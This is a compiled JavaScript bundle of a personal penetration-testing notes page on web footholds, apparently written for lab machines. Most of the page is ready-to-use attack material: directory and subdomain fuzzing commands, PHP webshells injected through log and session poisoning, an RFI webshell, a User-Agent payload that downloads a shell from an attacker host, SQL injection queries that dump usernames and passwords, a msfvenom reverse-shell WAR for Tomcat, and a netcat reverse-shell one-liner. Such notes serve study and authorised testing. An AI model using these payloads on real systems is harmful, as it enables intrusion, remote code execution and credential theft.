"use strict";(self.webpackChunkthe_nest_new=self.webpackChunkthe_nest_new||[]).push([[212],{3905:function(e,t,n){n.d(t,{Zo:function(){return c},kt:function(){return m}});var a=n(7294);function l(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function r(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){l(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function o(e,t){if(null==e)return{};var n,a,l=function(e,t){if(null==e)return{};var n,a,l={},i=Object.keys(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||(l[n]=e[n]);return l}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(l[n]=e[n])}return l}var s=a.createContext({}),p=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):r(r({},t),e)),n},c=function(e){var t=p(e.components);return a.createElement(s.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,l=e.mdxType,i=e.originalType,s=e.parentName,c=o(e,["components","mdxType","originalType","parentName"]),d=p(n),m=l,h=d["".concat(s,".").concat(m)]||d[m]||u[m]||i;return n?a.createElement(h,r(r({ref:t},c),{},{components:n})):a.createElement(h,r({ref:t},c))}));function m(e,t){var n=arguments,l=t&&t.mdxType;if("string"==typeof e||l){var i=n.length,r=new Array(i);r[0]=d;var o={};for(var s in t)hasOwnProperty.call(t,s)&&(o[s]=t[s]);o.originalType=e,o.mdxType="string"==typeof e?e:l,r[1]=o;for(var p=2;p<i;p++)r[p]=n[p];return a.createElement.apply(null,r)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},4118:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return o},contentTitle:function(){return s},metadata:function(){return p},toc:function(){return c},default:function(){return d}});var a=n(7462),l=n(3366),i=(n(7294),n(3905)),r=["components"],o={sidebar_position:2},s="Web",p={unversionedId:"cybersecurity/pentest-notes/foothold/web",id:"cybersecurity/pentest-notes/foothold/web",title:"Web",description:"Great references:",source:"@site/docs/cybersecurity/pentest-notes/foothold/web.md",sourceDirName:"cybersecurity/pentest-notes/foothold",slug:"/cybersecurity/pentest-notes/foothold/web",permalink:"/the-nest/docs/cybersecurity/pentest-notes/foothold/web",editUrl:"https://github.com/crystalwwj/the-nest/edit/main/docs/cybersecurity/pentest-notes/foothold/web.md",tags:[],version:"current",sidebarPosition:2,frontMatter:{sidebar_position:2},sidebar:"tutorialSidebar",previous:{title:"Host Discovery and Service Enumeration",permalink:"/the-nest/docs/cybersecurity/pentest-notes/foothold/discovery-and-enum"},next:{title:"Using common services",permalink:"/the-nest/docs/cybersecurity/pentest-notes/foothold/services"}},c=[{value:"Scanning",id:"scanning",children:[{value:"Wfuzz",id:"wfuzz",children:[],level:3},{value:"Other scanners",id:"other-scanners",children:[],level:3}],level:2},{value:"File inclusion (LFI/RFI to RCE)",id:"file-inclusion-lfirfi-to-rce",children:[{value:"Log contaminating",id:"log-contaminating",children:[],level:3},{value:"from RFI",id:"from-rfi",children:[],level:3},{value:"Session poisoning",id:"session-poisoning",children:[],level:3},{value:"proc/self/enversion or proc/self/environ",id:"procselfenversion-or-procselfenviron",children:[],level:3},{value:"proc/self/fd",id:"procselffd",children:[],level:3},{value:"PHP wrapper",id:"php-wrapper",children:[],level:3}],level:2},{value:"SQL injection",id:"sql-injection",children:[{value:"Manual",id:"manual",children:[{value:"MySQL",id:"mysql",children:[],level:4}],level:3},{value:"Tools",id:"tools",children:[],level:3}],level:2},{value:"Other Tips",id:"other-tips",children:[],level:2}],u={toc:c};function d(e){var t=e.components,n=(0,l.Z)(e,r);return(0,i.kt)("wrapper",(0,a.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"web"},"Web"),(0,i.kt)("p",null,"Great references:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://github.com/w181496/Web-CTF-Cheatsheet"},"Web-CTF-Cheatsheet")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://book.hacktricks.xyz/pentesting-web/"},"Hacktricks"))),(0,i.kt)("h2",{id:"scanning"},"Scanning"),(0,i.kt)("p",null,"When given a url, domain, or ip with http port, do some web scanning to find additional endpoints, folders, or whatever potentially accessible paths. "),(0,i.kt)("div",{className:"admonition admonition-tip alert alert--success"},(0,i.kt)("div",{parentName:"div",className:"admonition-heading"},(0,i.kt)("h5",{parentName:"div"},(0,i.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,i.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"12",height:"16",viewBox:"0 0 12 16"},(0,i.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"}))),"My tip")),(0,i.kt)("div",{parentName:"div",className:"admonition-content"},(0,i.kt)("p",{parentName:"div"},"If you get a 403 on one dir, try enumerating more dirs and files UNDER that 403 dir!"))),(0,i.kt)("p",null,"Fav wordlists for different purposes:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"/usr/share/dirb/wordlists/common.txt")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"/usr/share/wordlists/rockyou.txt"))),(0,i.kt)("p",null,"For fast scanning with multiple file extension prefixes, I personally think dirbuster is easier, but I'm more used to copy-pasting wfuzz commands."),(0,i.kt)("h3",{id:"wfuzz"},"Wfuzz"),(0,i.kt)("p",null,"Find directory"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"wfuzz -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -Z --hc 404 https://ip.htb/FUZZ\n")),(0,i.kt)("p",null,"Find files (php)"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"wfuzz -w /usr/share/seclists/Discovery/Web-Content/PHP.fuzz.txt --hc 404 https://laboratory.htb/FUZZ\n")),(0,i.kt)("p",null,"Find files (apache)"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"wfuzz -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt -Z --hc 404,500 http://academy.htb/FUZZ\n")),(0,i.kt)("p",null,"Find subdomain"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.academy.htb" --hc 404,302 --hw 356 -t 100 10.10.10.215\n\nwfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u \'http://target.tld\' -H "Host: FUZZ.target.tld" --hw 290\n')),(0,i.kt)("h3",{id:"other-scanners"},"Other scanners"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'feroxbuster -u https://10.10.10.250:443 -t 10 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -o /home/unicorn011/Desktop/HTB/seal/results/10.10.10.250/scans/tcp_443_https_feroxbuster_big.txt\n')),(0,i.kt)("h2",{id:"file-inclusion-lfirfi-to-rce"},"File inclusion (LFI/RFI to RCE)"),(0,i.kt)("p",null,"If you find a LFI vuln, try application-specific config files such as ",(0,i.kt)("inlineCode",{parentName:"p"},".env"),", ",(0,i.kt)("inlineCode",{parentName:"p"},"config.json"),", ",(0,i.kt)("inlineCode",{parentName:"p"},"composer.json")," and also check files related to the running process: ",(0,i.kt)("inlineCode",{parentName:"p"},"/proc/self/environ"),", ",(0,i.kt)("inlineCode",{parentName:"p"},"/proc/self/cwd/<file>"),", ",(0,i.kt)("inlineCode",{parentName:"p"},"/proc/self/cmdline"),"."),(0,i.kt)("p",null,"Some common config locations for both linux and windows, see ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI"},"fuzzdb collection"),"."),(0,i.kt)("p",null,"Also check out ",(0,i.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/pentesting-web/file-inclusion#blind-interesting-lfi2rce-files"},"Hacktricks file inclusion")),(0,i.kt)("p",null,"Here's a simple list:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"phpinfo.php\n/etc/php/php.ini/etc/nginx/nginx.conf/etc/apache2/sites-available/000-default.conf\n/etc/apache2/apache2.conf \n\ufffc \n# User information \n/etc/passwd \n/etc/shadow # \u901a\u5e38\u8981 root \u6b0a\u9650 \n# Process information/proc/self/cwd # symbolic link \u5230 cwd \n/proc/self/exe # \u76ee\u524d\u7684\u57f7\u884c\u6a94/proc/self/environ # \u74b0\u5883\u8b8a\u6578/proc/self/fd/[num] # file descriptor \n/proc/sched_debug # Processes \n\n# Network\n/etc/hosts\n/proc/net/* \n/proc/net/fib_trie\n/proc/net/[tcp,udp]\n/proc/net/route/proc/net/arp \n")),(0,i.kt)("p",null,"You can find more webshells in kali under ",(0,i.kt)("inlineCode",{parentName:"p"},"/usr/share/webshells")),(0,i.kt)("p",null,"Here's also a great resource: ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md"},"PayloadsAllTheThings")),(0,i.kt)("h3",{id:"log-contaminating"},"Log contaminating"),(0,i.kt)("p",null,"Note: You have to find the location of logs first!!"),(0,i.kt)("p",null,"Since usually all URLs and requests are logged, we can try to submit a request with PHP code then include the log file. The non-PHP parts will be ignored, and the injected lFI payload will be executed. You can either embed the command in a URL parameter or directly send to port 80:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ nc -nv 10.11.0.22 80\n(UNKNOWN) [10.11.0.22] 80 (http) open\n<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>\nHTTP/1.1 400 Bad Request\n")),(0,i.kt)("p",null,"The log will be at the bottom of the ",(0,i.kt)("inlineCode",{parentName:"p"},"access.log")," file:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-txt"},'10.11.11.1 - - [30/Dec/2019:13:58:07 -0500] "GET /example.php HTTP/1.1" 200 1189 "http://10.11.11.3/menu.php?file=/" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"\n10.11.11.1 - - [30/Dec/2019:14:01:41 -0500] ""<?php echo \'<pre>\' . shell_exec($_GET[\'cmd\']) . \'</pre>\';?>\\n" 400 981 "-" "-"\n')),(0,i.kt)("p",null,"Then we can trigger code execution with LFI:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"# windows\nhttp://10.11.11.3/menu.php?file=c:\\xampp\\apache\\logs\\access.log&cmd=ipconfig\n\n# linux\nhttp://10.11.11.3/menu.php?file=/var/log/apache2/access.log&cmd=ipconfig\n")),(0,i.kt)("h3",{id:"from-rfi"},"from RFI"),(0,i.kt)("p",null,"RFI means that the victim server allows fetching remote sources for PHP files, so you can host the script on your computer or domain and instruct the victim to fetch and execute it. This happens when the PHP app is configured with ",(0,i.kt)("inlineCode",{parentName:"p"},"allow_url_include")," enabled."),(0,i.kt)("p",null,"For example, a simple webshell:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-PHP",metastring:'title="evil.php"',title:'"evil.php"'},"<?php echo system($_GET['cmd']); ?>\n")),(0,i.kt)("p",null,"However, you shouldn't host the file with a PHP extension because then the file will be executed on the server side (your computer) when it's fetched."),(0,i.kt)("p",null,"Save the file as a txt since PHP code within a txt file will still get executed when using ",(0,i.kt)("inlineCode",{parentName:"p"},"include()"),". "),(0,i.kt)("p",null,"Host the file and fetch with RFI to exploit:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"http://10.11.11.3/menu.php?file=http://<my-ip>/evil.txt&cmd=ls\n")),(0,i.kt)("p",null,"If certain file extensions are blocked or added, you can try:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"adding a null byte to end of string"),(0,i.kt)("li",{parentName:"ul"},"add question mark '?' to end of RFI payload so that anything added to URL is treated as query string")),(0,i.kt)("h3",{id:"session-poisoning"},"Session poisoning"),(0,i.kt)("p",null,"If the website uses PHP sessions (PHPSESSID in cookie), the sessions are stored in ",(0,i.kt)("inlineCode",{parentName:"p"},"/var/lib/php5/sess_<PHPSESSID>"),":"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.\nuser_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";\n')),(0,i.kt)("p",null,"If you set the cookie to PHP code, you might overwrite the data in the session file:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=menu.php\n')),(0,i.kt)("p",null,"Use LFI to include the session file and trogger execution"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"http://10.11.11.3/menu.php?file=/../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2\n")),(0,i.kt)("h3",{id:"procselfenversion-or-procselfenviron"},"proc/self/enversion or proc/self/environ"),(0,i.kt)("p",null,"If ",(0,i.kt)("inlineCode",{parentName:"p"},"proc/self/enversion")," is readable, we can put the payload in the ",(0,i.kt)("inlineCode",{parentName:"p"},"user-agent")," HTTP header and then include it. Technique described in ",(0,i.kt)("a",{parentName:"p",href:"https://www.exploit-db.com/papers/12886"},"ExploitDB"),":"),(0,i.kt)("p",null,"First ensure we can access ",(0,i.kt)("inlineCode",{parentName:"p"},"proc/self/enversion"),". If successful, will see something like:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-txt"},"DOCUMENT_ROOT=/home/sirgod/public_html GATEWAY_INTERFACE=CGI/1.1 HTTP_ACCEPT=text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1 HTTP_COOKIE=PHPSESSID=134cc7261b341231b9594844ac2ad7ac HTTP_HOST=www.website.com HTTP_REFERER=http://www.website.com/index.php?view=../../../../../../etc/passwd HTTP_USER_AGENT=Opera/9.80 (Windows NT 5.1; U; en) Presto/2.2.15 Version/10.00 PATH=/bin:/usr/bin QUERY_STRING=view=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron REDIRECT_STATUS=200 REMOTE_ADDR=6x.1xx.4x.1xx REMOTE_PORT=35665 REQUEST_METHOD=GET REQUEST_URI=/index.php?view=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron SCRIPT_FILENAME=/home/sirgod/public_html/index.php SCRIPT_NAME=/index.php SERVER_ADDR=1xx.1xx.1xx.6x SERVER_ADMIN=webmaster@website.com SERVER_NAME=www.website.com SERVER_PORT=80 SERVER_PROTOCOL=HTTP/1.0 SERVER_SIGNATURE=\nApache/1.3.37 (Unix) mod_ssl/2.2.11 OpenSSL/0.9.8i DAV/2 mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 Server at www.website.com Port 80\n")),(0,i.kt)("p",null,"To inject code, lfi with target ",(0,i.kt)("inlineCode",{parentName:"p"},"proc/self/enversion")," again but include payload:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-txt"},"User-Agent: <?system('wget http://my-site/my-shell.txt -O shell.php');?>\n")),(0,i.kt)("p",null,"Command will be executed and the shell will be written in the same directory as the lfi. Access directly. Same goes for ",(0,i.kt)("inlineCode",{parentName:"p"},"proc/self/environ"),"."),(0,i.kt)("h3",{id:"procselffd"},"proc/self/fd"),(0,i.kt)("p",null,"Very similar to poisoning log files, but now we're trying file descriptor files. The directory ",(0,i.kt)("inlineCode",{parentName:"p"},"proc/self/fd")," contains symbolic links to open file handlers for each process, named ",(0,i.kt)("inlineCode",{parentName:"p"},"proc/self/fd/<id>"),". We can use burp to fuzz the file descriptors, and one of them would point to the access log file. We just need to send a request with php code and by re-loading the file with lfi we get a shell!"),(0,i.kt)("h3",{id:"php-wrapper"},"PHP wrapper"),(0,i.kt)("p",null,"PHP comes with several wrappers that can be used to bypass checks and sneak data XDDD"),(0,i.kt)("p",null,"For wrapper tricks, see:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers"},"Hacktricks - LFI/RFI using PHP Wrappers"))),(0,i.kt)("p",null,"For example, we can use the ",(0,i.kt)("inlineCode",{parentName:"p"},"data")," wrapper to write an input stream:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'http://10.11.11.3/menu.php?file=data:text/plain,<?php echo system("ls") ?>\n')),(0,i.kt)("h2",{id:"sql-injection"},"SQL injection"),(0,i.kt)("div",{className:"admonition admonition-tip alert alert--success"},(0,i.kt)("div",{parentName:"div",className:"admonition-heading"},(0,i.kt)("h5",{parentName:"div"},(0,i.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,i.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"12",height:"16",viewBox:"0 0 12 16"},(0,i.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"}))),"My tip")),(0,i.kt)("div",{parentName:"div",className:"admonition-content"},(0,i.kt)("p",{parentName:"div"},"For MSSQL, NO DOUBLE QUOTES! USE DOUBLE SINGLE QUOTES!!"))),(0,i.kt)("h3",{id:"manual"},"Manual"),(0,i.kt)("p",null,"Awesome cheatsheets:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet"},"Pentest Monkey")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"},"Payload All the Things"))),(0,i.kt)("h4",{id:"mysql"},"MySQL"),(0,i.kt)("p",null,"Start with finding number of columns. For example, using union-based select statement + order by until SQL error:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-SQL"},"union select * from price order by 1\nunion select * from price order by 2\n...\n")),(0,i.kt)("p",null,"Find databases:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-SQL"},"union select 1,group_concat(0x7c,schema_name,0x7c),3,4,5,6,7,8,9 from information_schema.schemata\n")),(0,i.kt)("p",null,"Find tables:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-SQL"},'union select 1,group_concat(0x7c,table_name,0x7c),3,4,5,6,7,8,9 fRoM information_schema.tables where table_schema="web"\n')),(0,i.kt)("p",null,"Find columns:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-SQL"},'union select 1,group_concat(0x7c,schema_name,0x7c),3,4,5,6,7,8,9 fRoM information_schema.columns where table_name="backend_users"\n')),(0,i.kt)("p",null,"Read data:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-SQL"},"union select 1,group_concat(0x7c,username,0x7c),group_concat(0x7c,password,0x7c),4,5,6,7,group_concat(0x7c,description,0x7c),9 fRoM backend_users\n")),(0,i.kt)("h3",{id:"tools"},"Tools"),(0,i.kt)("p",null,"Wfuzz"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d "username=FUZZ&password=ss" --hc 200 -u http://admin.cronos.htb/index.php\n')),(0,i.kt)("p",null,"SQLmap:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://github.com/sqlmapproject/sqlmap/wiki/Usage"},"official usage tutorial")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://thedarksource.com/sqlmap-cheat-sheet/"},"cheatsheets"))),(0,i.kt)("p",null,"GET"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'sqlmap -u "https://target_site.com/page?p1=value1&p2=value2" -p p1\n')),(0,i.kt)("p",null,"POST"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'sqlmap -u http://10.10.10.58:3000/api/session/authenticate --data "username=1&password=2" -p "username,password" --method POST\n')),(0,i.kt)("p",null,"Can also export from Burp with 'Copy to File', then import into sqlmap with ",(0,i.kt)("inlineCode",{parentName:"p"},"sqlmap -r <file>"),". Remember to remove injection payload in file first."),(0,i.kt)("p",null,"Useful options:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"listing stuff",(0,i.kt)("ul",{parentName:"li"},(0,i.kt)("li",{parentName:"ul"},"dbs: ",(0,i.kt)("inlineCode",{parentName:"li"},"--dbs")),(0,i.kt)("li",{parentName:"ul"},"tables: ",(0,i.kt)("inlineCode",{parentName:"li"},"-D <target DB> --tables")),(0,i.kt)("li",{parentName:"ul"},"columns: ",(0,i.kt)("inlineCode",{parentName:"li"},"-D <target DB> -T <target table> --columns")))),(0,i.kt)("li",{parentName:"ul"},"dumping",(0,i.kt)("ul",{parentName:"li"},(0,i.kt)("li",{parentName:"ul"},"a specific column: ",(0,i.kt)("inlineCode",{parentName:"li"},'-D <target DB> -T <target table> -C "Col1,Col2" --dump')),(0,i.kt)("li",{parentName:"ul"},"everything(READ: will take FOREVER): ",(0,i.kt)("inlineCode",{parentName:"li"},"--dump")))),(0,i.kt)("li",{parentName:"ul"},"get shell",(0,i.kt)("ul",{parentName:"li"},(0,i.kt)("li",{parentName:"ul"},"get os shell: ",(0,i.kt)("inlineCode",{parentName:"li"},"--os-shell")),(0,i.kt)("li",{parentName:"ul"},"get SQL shell: ",(0,i.kt)("inlineCode",{parentName:"li"},"--sqlmap-shell"))))),(0,i.kt)("h2",{id:"other-tips"},"Other Tips"),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},(0,i.kt)("p",{parentName:"li"},"If running Tomcat and we have credentials, deploy war file with reverse shell like ",(0,i.kt)("a",{parentName:"p",href:"https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script"},"this")),(0,i.kt)("pre",{parentName:"li"},(0,i.kt)("code",{parentName:"pre"},"# generate reverse shell\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=1234 -f war -o shell.war\n\n# tomcat 6\ncurl --upload-file target\\debug.war \"http://tomcat:tomcat@localhost:8088/manager/deploy?path=/debug&update=true\"\n\n# tomcat 7 & 8\ncurl -v -u some_user:some_password -T /../my_app.war 'http://127.0.0.1:tomcat_port/manager/text/deploy?path=/my_app&update=true'\n\nthen visit http://webite/shell\n"))),(0,i.kt)("li",{parentName:"ol"},(0,i.kt)("p",{parentName:"li"},"Bypass 403 with forged IP headers, such as ",(0,i.kt)("inlineCode",{parentName:"p"},"X-Forwarded-For"),", ",(0,i.kt)("inlineCode",{parentName:"p"},"X-Client-IP"),", ",(0,i.kt)("inlineCode",{parentName:"p"},"X-Remote-Addr"))),(0,i.kt)("li",{parentName:"ol"},(0,i.kt)("p",{parentName:"li"},"Upload web.config to get RCE: ",(0,i.kt)("a",{parentName:"p",href:"https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/"},"Uploading web.config For Fun and Profit"))),(0,i.kt)("li",{parentName:"ol"},(0,i.kt)("p",{parentName:"li"},"If ",(0,i.kt)("inlineCode",{parentName:"p"},"/cgi-bin")," exists, try scanning for ",(0,i.kt)("inlineCode",{parentName:"p"},".sh .pl .cgi")," files under it. (Try common.txt wordlist) There might be ",(0,i.kt)("inlineCode",{parentName:"p"},"shellshock"),"!")),(0,i.kt)("li",{parentName:"ol"},(0,i.kt)("p",{parentName:"li"},"Stable PHP reverse shell: ",(0,i.kt)("inlineCode",{parentName:"p"},'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f");')))))}d.isMDXComponent=!0}}]);